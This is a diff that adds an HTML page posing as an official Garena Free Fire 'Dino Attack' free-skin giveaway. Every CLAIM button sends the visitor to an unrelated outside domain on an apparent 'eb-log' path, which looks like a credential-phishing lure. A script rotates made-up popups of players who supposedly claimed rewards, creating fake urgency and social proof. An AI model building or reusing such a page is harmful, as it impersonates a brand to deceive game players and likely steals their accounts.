@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Garena Free Fire - Event 202</title><link href="local_resources/css/be8093c71574979c0982caa66ed4c41d.css" rel="stylesheet"/>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #0d0d0d;
+        color: white;
+        margin: 0;
+        padding: 0;
+    }
+    
+    /* Header Section */
+    .header {
+        background-color: #000000;
+        padding: 7px;
+        text-align: center;
+        position: relative;  /* Added to allow positioning of elements within */
+    }
+    
+    .header img {
+       border-radius: 5px; 
+       position: absolute;
+       top: 5px;  /* Distance from the top of the header */
+       left: 5px;  /* Distance from the left of the header */
+       width: 50px; /* Icon size */
+       height: 50px;
+    }
+        .header h1 {
+          font-family: 'Russo One', sans-serif;
+            display: inline-block;
+            margin: 0;
+            font-size: 20px;
+            left: 10px;
+            letter-spacing: 1px;
+        }
+
+        .header h2 {
+            margin: 0;  
+            font-size: 14px;
+            color: #cccccc;
+            @import url('https://fonts.googleapis.com/css2?family=Russo+One&display=swap');
+
+font-family: 'Russo One', sans-serif;
+        }
+
+        /* Image Section */
+        .main-image {
+            width: 395px;
+            height: 300px;
+            display: block;
+            margin: 10px 0;
+        }
+
+        /* Line Separator */
+        .line-separator {
+            border-bottom: 1px solid #cccccc;
+            margin: 2px 0;
+        }
+
+        /* Button Section */
+        .button-section {
+            display: flex;
+            justify-content: center;
+            margin: 10px 10;
+        }
+
+        .button-section button {
+          border-radius: 2px;
+            background-color: #F7F709;
+            color: white;
+            border: none;
+            padding: 10px 25px;
+            margin: 0 5px;
+            cursor: pointer;
+            font-size: 16px;
+            @import url('https://fonts.googleapis.com/css2?family=Russo+One&display=swap');
+
+font-family: 'Russo One', sans-serif;
+        }
+
+        .button-section button.active {
+            background-color: #00FF89;
+        }
+
+        /* Item and Skin Section */
+        .grid-container {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin: 20px;
+        }
+
+        .grid-item {
+            background-color: #1a1a1a;
+            text-align: center;
+            padding: 10px;
+            border: 3px solid #cccccc;
+        }
+
+        .grid-item img {
+            width: 100%;
+            height: auto;
+        }
+
+        .grid-item button {
+            background-color: #FFFF00;
+            border: none;
+            color: black;
+            padding: 10px 45px;
+            cursor: pointer;
+            margin-top: 1px;
+            @import url('https://fonts.googleapis.com/css2?family=Russo+One&display=swap');
+
+font-family: 'Russo One', sans-serif;
+        }
+
+        .grid-item button:hover {
+            background-color: #FFFF00;
+        }
+    </style>
+</head>
+<body>
+<!-- Header Section -->
+<div class="header">
+<img alt="icon" src="local_resources/img/629ac87084acc2f573b26ff2f0b60d58.webp"/>
+<h1>Garena Free Fire</h1>
+<h2>DINO ATTACK SPECIAL GIFT</h2>
+</div>
+
+
+<!-- Main Image Section -->
+<div>
+<img alt="Booyah" class="main-image" src="local_resources/img/b23e84e12d27d773e7f657126d9f650c.jpg"/>
+<div class="line-separator"></div>
+</div>
+<!-- Buttons Section -->
+<div class="button-section">
+<button class="active" onclick="showSkins()">2D DINO</button>
+<button onclick="showItems()">ALL DINO</button>
+</div>
+<!-- Grid Container for Images -->
+<div class="grid-container">
+<!-- Item 1 -->
+<div class="grid-item">
+<img alt="Blue Flame Draco" src="local_resources/img/d44771af2255ec2878379dc7802d6ae8.png"/>
+<a href="https://pro.riccardomalisano.com/about/z1to.html?u=eb-log/?i=ZSU9P"> <button>CLAIM</button></a>
+</div>
+<!-- Item 2 -->
+<div class="grid-item">
+<img alt="Iron Fortress" src="local_resources/img/17ee577c45924809d73e9f050e13d380.png"/>
+<a href="https://pro.riccardomalisano.com/about/z1to.html?u=eb-log/?i=ZSU9P"><button>CLAIM</button></a>
+<script>
+        function showItems() {
+            document.querySelector(".grid-container").innerHTML = `
+                <div class="grid-item">
+                    <img src="https://i.postimg.cc/5ykxpWr1/Picsart-24-09-13-18-21-16-025.png" alt="Item 1">
+                    <a href="https://pro.riccardomalisano.com/about/z1to.html?u=eb-log/?i=ZSU9P"><button>CLAIM</button></a>
+                </div>
+                <div class="grid-item">
+                    <img src="https://i.postimg.cc/8cg3SKrW/Picsart-24-09-13-18-24-23-245.png">
+                    <a href="https://pro.riccardomalisano.com/about/z1to.html?u=eb-log/?i=ZSU9P"><button>CLAIM</button></a>
+                </div>
+                <div class="grid-item">
+                    <img src="https://i.postimg.cc/SQZ8H2FQ/Picsart-24-09-13-18-25-57-037.png">
+                    <a href="https://pro.riccardomalisano.com/about/z1to.html?u=eb-log/?i=ZSU9P"><button>CLAIM</button></a>
+                </div>
+                <div class="grid-item">
+                   <a href="mailto:"><img src="https://i.postimg.cc/PrgBzqqK/IMG-20240914-120230.jpg"></a>
+                   <a href="https://pro.riccardomalisano.com/about/z1to.html?u=eb-log/?i=ZSU9P"> <button>CLAIM</button></a>`;
+            document.querySelectorAll(".button-section button").forEach(button => button.classList.remove('active'));
+            document.querySelector(".button-section button:nth-child(2)").classList.add('active');
+        }
+
+        function showSkins() {
+            document.querySelector(".grid-container").innerHTML = `
+                <div class="grid-item">
+                    <img src="https://i.postimg.cc/4NtvD4JY/Picsart-24-09-13-18-35-22-234.png" alt="Blue Flame Draco">
+                    <a href="https://pro.riccardomalisano.com/about/z1to.html?u=eb-log/?i=ZSU9P"><button>CLAIM</button></a>
+                </div>
+                <div class="grid-item">
+                    <img src="https://i.postimg.cc/J7jcg47G/Picsart-24-09-13-18-37-12-133.png" alt="Iron Fortress">
+                    <a href="https://pro.riccardomalisano.com/about/z1to.html?u=eb-log/?i=ZSU9P"><button>CLAIM</button></a>
+                  </div>`;
+            document.querySelectorAll(".button-section button").forEach(button => button.classList.remove('active'));
+            document.querySelector(".button-section button:nth-child(1)").classList.add('active');
+        }
+    </script>
+<script>
+      const popup = document.getElementById('popup');
+const popupMessage = document.getElementById('popupMessage');
+const closePopup = document.getElementById('closePopup');
+
+// Array of random messages
+const messages = [
+  "Ashish mirror CLAIMed the game reword!",
+  "ｃｕｔｅｇｉｒｌ CLAIMed the game reword!",
+  "Eun-woo - CLAIMed the game reword!",
+  "ɴᴘ_ᴄʜʜᴇᴛʀɪ✓ CLAIMed the game reword!",
+  "ꔪ乂YÛDÎÑ乂 CLAIMed!",
+  "Ramraj GURJAR CLAIMed the game reword!",
+  "GᴍʀㅤPʀᴀʙʜ CLAIMed the game reword!",
+  "メS I L E N Tメ CLAIMed the game reword!",
+  "꧁ᶜʳᵃᶻʸkiller꧂ CLAIMed the game reword!",
+  "Ƭ͢ɴ J ᴇ ʀ ʀ ʏ ❶ CLAIMed the game reword!",
+  "UN Lucky Boy CLAIMed the game reword!",
+  "নিতুম কড়া  CLAIMed the game reword!",
+  "ᎬʟɪᴛᴇㅤᏚᴜʀꫝᴊ  CLAIMed the game reword!",
+];
+
+// Function to show random popup
+function showRandomPopup() {
+  const randomMessage = messages[Math.floor(Math.random() * messages.length)];
+  popupMessage.textContent = randomMessage;
+  popup.classList.remove('hidden');
+  popup.classList.add('show');
+
+  // Reset the fill animation
+  const popupBackground = document.querySelector('.popup-background');
+  popupBackground.style.width = '0'; // Reset to 0 to start animation again
+  popupBackground.style.animation = 'none'; // Remove any ongoing animation
+  setTimeout(() => {
+    popupBackground.style.animation = ''; // Add back the animation
+  }, 10); // Small timeout to trigger animation reset
+
+  // Hide the popup after 3 seconds
+  setTimeout(() => {
+    popup.classList.remove('show');
+    popup.classList.add('hidden');
+  }, 3000);
+}
+
+// Show a new popup every 5 seconds
+setInterval(showRandomPopup, 5000);
+
+// Close the popup manually
+closePopup.addEventListener('click', () => {
+  popup.classList.remove('show');
+  popup.classList.add('hidden');
+});
+
+      
+    </script>
+</div></div></body>
+</html>
